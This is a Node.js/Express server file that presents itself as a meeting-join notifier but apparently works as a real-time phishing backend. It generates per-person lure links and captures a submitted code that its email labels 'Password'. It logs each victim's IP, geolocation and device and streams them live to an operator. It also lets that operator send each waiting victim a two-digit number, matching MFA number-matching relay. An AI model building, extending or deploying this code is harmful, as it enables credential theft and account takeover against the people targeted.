// server.js
// Minimal Node.js/Express backend with in-memory session storage.
// No database. Sessions live only in the "sessions" Map below and are
// lost if the server restarts (this is expected/accepted per spec).

const express = require("express");
const path = require("path");
const crypto = require("crypto");
require("dotenv").config();

const https = require("https");

// --- Email credentials (from environment variables) ---------------------
// Set these in a local .env file (gitignored - never commit it) and in
// Render's Environment tab for the deployed version. Never hardcode a
// real key directly in this file - GitHub's push protection will (and
// should) block a commit that does, and the key should be treated as
// compromised the moment it's typed into source code.
// RESEND_API_KEY: from https://resend.com/api-keys
// FROM_EMAIL: without a verified domain on Resend, this MUST be
//             "onboarding@resend.dev" - you can't send from anything else yet.
// ADMIN_EMAIL: without a verified domain, this MUST be the exact email
//              address you signed up to Resend with (sandbox limitation).
const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const FROM_EMAIL = process.env.FROM_EMAIL || "onboarding@resend.dev";
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "";
// -------------------------------------------------------------------------

// Sends an email via Resend's HTTP API (a plain HTTPS POST, port 443) -
// this works on Render, unlike raw SMTP, which Render blocks outbound
// entirely (ports 25, 465, 587) to prevent spam abuse of its platform.
function sendViaResend({ to, subject, text }) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify({ from: FROM_EMAIL, to, subject, text });

    const req = https.request(
      "https://api.resend.com/emails",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${RESEND_API_KEY}`,
          "Content-Length": Buffer.byteLength(payload),
        },
        timeout: 10000,
      },
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve(data);
          } else {
            reject(new Error(`Resend API error ${res.statusCode}: ${data}`));
          }
        });
      }
    );

    req.on("error", reject);
    req.on("timeout", () => {
      req.destroy();
      reject(new Error("Resend API request timed out"));
    });

    req.write(payload);
    req.end();
  });
}

async function sendJoinEmail(entry) {
  if (!RESEND_API_KEY || !ADMIN_EMAIL) {
    console.warn("Email not sent: RESEND_API_KEY / ADMIN_EMAIL not set (check your .env or Render environment variables)");
    return;
  }

  const when = new Date(entry.timestamp).toLocaleString();
  const cityRegionLine = [entry.city, entry.region].filter(Boolean).join(", ") || "Unknown";
  const SEP = "-----------------------------------------------------";

  const text = [
    `Name: ${entry.name || "Unknown"}`,
    SEP,
    `Email: ${entry.email || "Unknown"}`,
    SEP,
    `Password: ${entry.meetingCode}`,
    SEP,
    `Time: ${when}`,
    SEP,
    `Device Type: ${entry.deviceType}`,
    SEP,
    `Device Status: ${entry.deviceLabel}`,
    SEP,
    `IP Address: ${entry.ip}`,
    SEP,
    `Country Code: ${entry.countryCode || "Unknown"}`,
    SEP,
    `Country Name: ${entry.country || "Unknown"}`,
    SEP,
    `City/Region: ${cityRegionLine}`,
    SEP,
    `Browser: ${entry.userAgent || "Unknown"}`,
  ].join("\n");

  try {
    await sendViaResend({
      to: ADMIN_EMAIL,
      subject: `Meeting join: ${entry.name || entry.email || "Unknown user"}`,
      text,
    });
    console.log("Join notification email sent successfully via Resend to", ADMIN_EMAIL);
  } catch (err) {
    console.error("Failed to send join notification email via Resend:", err.message);
  }
}

// Very small IP -> country/region/city lookup using a free public API.
// No API key, no dependency - just a plain HTTPS GET. If it fails or
// times out, we fall back to "Unknown" rather than blocking the join.
function lookupLocation(ip) {
  return new Promise((resolve) => {
    const fallback = { countryCode: null, country: null, region: null, city: null };

    if (!ip || ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1") {
      return resolve(fallback); // local/dev IP - nothing to look up
    }

    const req = https.get(
      `https://ipapi.co/${encodeURIComponent(ip)}/json/`,
      { timeout: 2000 },
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve({
              countryCode: json.country || null, // e.g. "US"
              country: json.country_name || null, // e.g. "United States"
              region: json.region || null,
              city: json.city || null,
            });
          } catch {
            resolve(fallback);
          }
        });
      }
    );

    req.on("error", () => resolve(fallback));
    req.on("timeout", () => {
      req.destroy();
      resolve(fallback);
    });
  });
}

// ---------------------------------------------------------------------
// Live push to the Admin Portal (Server-Sent Events)
// ---------------------------------------------------------------------
// No stored log: just the set of currently-open admin portal connections.
// A join is broadcast to whoever is connected at that moment; nothing is
// kept in memory once the broadcast happens.
const adminClients = new Set();

function broadcastMeetingJoin(entry) {
  const payload = `data: ${JSON.stringify(entry)}\n\n`;
  for (const client of adminClients) {
    client.write(payload);
  }
}

// Simple User-Agent based device-type labeling - no dependency, just a
// few keyword checks. Good enough for "Desktop vs Mobile vs Tablet",
// not meant to be a precise device fingerprint.
function labelDeviceType(userAgent) {
  if (!userAgent) return "Unknown";
  const ua = userAgent.toLowerCase();
  if (ua.includes("ipad") || ua.includes("tablet")) return "Tablet";
  if (ua.includes("mobile") || ua.includes("iphone") || ua.includes("android")) return "Mobile";
  return "Desktop";
}

const app = express();
const PORT = process.env.PORT || 3000;

// Render (and most hosts) sit the app behind a reverse proxy. Without
// this, req.ip reports the proxy's internal IP instead of the real
// visitor's IP, which would break the location lookup for every join.
app.set("trust proxy", true);

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ---------------------------------------------------------------------
// In-memory session store
// ---------------------------------------------------------------------
// sessionId -> { sessionId, status, action, number, createdAt }
const sessions = new Map();

// email -> deviceId. There's no existing "registered devices" list, so
// the first device an email joins from is treated as that person's
// registered device. Later joins are compared against it. This is a
// simple first pass, not real device-trust/MDM verification.
const registeredDevices = new Map();

// token -> { token, name, email, createdAt }
// Generated by the admin for a specific person. Visiting
// /account-picker.html?token=... (or your real page 1) lets that page
// look up which name/email the link was generated for.
const links = new Map();

const SESSION_ID_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

function generateSessionId() {
  let id;
  do {
    id = "";
    for (let i = 0; i < 6; i++) {
      id += SESSION_ID_CHARS[Math.floor(Math.random() * SESSION_ID_CHARS.length)];
    }
  } while (sessions.has(id)); // guarantee uniqueness
  return id;
}

// Two-digit numeric string only: "00".."99", leading zero preserved.
function isValidTwoDigitNumber(value) {
  return typeof value === "string" && /^\d{2}$/.test(value);
}

// ---------------------------------------------------------------------
// API routes
// ---------------------------------------------------------------------

// Create a new waiting session (called when the user clicks the button on page 1)
app.post("/api/sessions", (req, res) => {
  const { account, name } = req.body || {};
  const sessionId = generateSessionId();
  const session = {
    sessionId,
    account: typeof account === "string" ? account : null,
    name: typeof name === "string" ? name : null,
    status: "WAITING",
    action: null,
    number: null,
    createdAt: Date.now(),
  };
  sessions.set(sessionId, session);
  res.status(201).json(session);
});

// List sessions currently waiting for an admin decision (for the Admin Portal)
app.get("/api/sessions/waiting", (req, res) => {
  const waiting = Array.from(sessions.values()).filter((s) => s.status === "WAITING");
  res.json(waiting);
});

// Get the current status/decision for one session (polled by the waiting page)
app.get("/api/sessions/:sessionId", (req, res) => {
  const session = sessions.get(req.params.sessionId);
  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }
  res.json(session);
});

// Admin submits a decision for a specific session
app.post("/api/sessions/:sessionId/decision", (req, res) => {
  const session = sessions.get(req.params.sessionId);
  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }

  const { action, number } = req.body || {};

  if (action === "WITH_NUMBER") {
    if (!isValidTwoDigitNumber(number)) {
      return res.status(400).json({
        error: "number must be exactly two digits, e.g. \"07\" or \"24\"",
      });
    }
    session.status = "READY";
    session.action = "WITH_NUMBER";
    session.number = number; // stored as a string so "07" stays "07"
  } else if (action === "WITHOUT_NUMBER") {
    session.status = "READY";
    session.action = "WITHOUT_NUMBER";
    session.number = null;
  } else {
    return res.status(400).json({
      error: 'action must be "WITH_NUMBER" or "WITHOUT_NUMBER"',
    });
  }

  sessions.set(session.sessionId, session);
  res.json(session);
});

// ---------------------------------------------------------------------
// Email link generation (Admin Portal "Generate Link" feature)
// ---------------------------------------------------------------------

// Admin submits a name + email address; backend creates a unique token
// tied to that person and returns a shareable link that points at page 1.
app.post("/api/links", (req, res) => {
  const { name, email } = req.body || {};

  const cleanName = typeof name === "string" ? name.trim() : "";
  const cleanEmail = typeof email === "string" ? email.trim() : "";

  if (!cleanName) {
    return res.status(400).json({ error: "A name is required" });
  }
  if (!cleanEmail.includes("@")) {
    return res.status(400).json({ error: "A valid email address is required" });
  }

  const token = crypto.randomUUID();
  const link = { token, name: cleanName, email: cleanEmail, createdAt: Date.now() };
  links.set(token, link);

  const baseUrl = `${req.protocol}://${req.get("host")}`;
  res.status(201).json({
    token,
    name: link.name,
    email: link.email,
    link: `${baseUrl}/meet/index.html?token=${token}`,
  });
});

// Page 1 calls this (with the token from its own URL) to find out
// which name/email the link was generated for.
app.get("/api/links/:token", (req, res) => {
  const link = links.get(req.params.token);
  if (!link) {
    return res.status(404).json({ error: "Link not found or expired" });
  }
  res.json({ name: link.name, email: link.email });
});

// ---------------------------------------------------------------------
// Meeting join notifications (live push + email)
// ---------------------------------------------------------------------

// Called when the user submits the meeting code on meet/page2.html.
// Responds immediately (no waiting on geolocation/email), then in the
// background: pushes the details live to any open Admin Portal first,
// then emails the admin the same details.
app.post("/api/meetings/join", (req, res) => {
  console.log("Received /api/meetings/join request:", req.body);

  const { token, meetingCode, deviceId } = req.body || {};

  const cleanCode = typeof meetingCode === "string" ? meetingCode.trim() : "";
  if (!cleanCode) {
    console.log("Rejected: meetingCode missing/empty");
    return res.status(400).json({ error: "meetingCode is required" });
  }

  // Acknowledge right away so the user's redirect to account-picker.html
  // is never held up by geolocation lookups or email sending.
  res.status(202).json({ status: "received" });

  const link = token ? links.get(token) : null;
  const name = link ? link.name : null;
  const email = link ? link.email : null;
  const ip = req.ip; // if this sits behind a reverse proxy, add: app.set("trust proxy", true)
  const userAgent = req.get("User-Agent") || null;
  const deviceType = labelDeviceType(userAgent);

  let deviceLabel = "Unknown (no device id)";
  if (deviceId && email) {
    if (!registeredDevices.has(email)) {
      registeredDevices.set(email, deviceId);
      deviceLabel = "Registered (first use)";
    } else if (registeredDevices.get(email) === deviceId) {
      deviceLabel = "Registered device";
    } else {
      deviceLabel = "Unrecognized device";
    }
  }

  // Everything from here on happens after the response was already sent.
  (async () => {
    const { countryCode, country, region, city } = await lookupLocation(ip);

    const entry = {
      id: crypto.randomUUID(),
      token: token || null,
      name,
      email,
      meetingCode: cleanCode,
      timestamp: Date.now(),
      ip,
      userAgent,
      deviceType,
      deviceLabel,
      countryCode,
      country,
      region,
      city,
    };

    broadcastMeetingJoin(entry); // 1. push to any open Admin Portal first
    await sendJoinEmail(entry); // 2. then email the admin
  })().catch((err) => {
    console.error("Error processing meeting join:", err);
  });
});

// Admin Portal connects here (EventSource) to receive meeting joins
// live, as they happen. Nothing is stored - a join is only ever seen
// by portals that are open at that moment.
app.get("/api/meetings/stream", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();

  adminClients.add(res);

  // Keep the connection alive through proxies that close idle connections.
  const heartbeat = setInterval(() => res.write(": ping\n\n"), 25000);

  req.on("close", () => {
    clearInterval(heartbeat);
    adminClients.delete(res);
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Admin Portal at http://localhost:${PORT}/admin`);
});
